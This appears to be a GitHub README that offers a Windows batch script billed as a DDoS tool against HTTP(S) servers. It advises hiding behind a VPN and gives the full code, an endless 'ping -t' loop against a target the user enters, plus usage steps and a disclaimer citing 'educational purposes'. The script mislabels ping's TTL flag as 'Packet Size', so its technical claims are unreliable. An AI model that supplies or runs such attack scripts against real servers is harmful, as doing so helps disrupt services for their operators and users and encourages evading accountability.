# DDOS-Tool
Anonymous DDOS-Tool





# About
  
 A script to Attack http(s) servers                                                
 
make sure u have a vpn installed                

how to install a vpn here: https://youtu.be/te8KE71ndso



# Screenshot
![Unbenannt](https://user-images.githubusercontent.com/97392345/153496914-2f9daae4-6c52-42c6-83b3-5df5f23ee946.PNG)


# Install
 1) Copy the folllowing code to youre Notepad:
 
 @echo off
 
mode 67,16

title DDOS Attack by MR Jack

color 0a

cls

echo.
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

echo DDOS With Batchfile

echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

echo.

set /p x=Server-Target:

echo.

echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ping %x%

echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

@ping.exe 127.0.0.1 -n 5 -w 1000 > nul

goto Next

:Next

echo.

echo.

echo.

set /p m=ip Host:

echo.

set /p n=Packet Size:

echo.

:DDOS

color 0c

echo Attacking Server %m%

ping %m% -i %n% -t >nul

goto DDOS


2. when u are in the notepad dont forget to remove the Spaces of the code otherwise it wont work

3. its a batch file so save it as whateveruwant.bat
# Usage 


1.  enter the server target 

3.  it will automatic ping the Host. As shown in the Screenshot below:

![ok](https://user-images.githubusercontent.com/97392345/153502726-2b3df918-cdad-4388-84ab-5b08477c6ad1.PNG)
3. Now enter the ip . (u got it from the ping)

5. Now enter how many Threads/Packets u want to send to the server

Enjoy

# Disclaimer  
im not responsible for any Damage caused with this Tool. use it only for educational purposes only.  

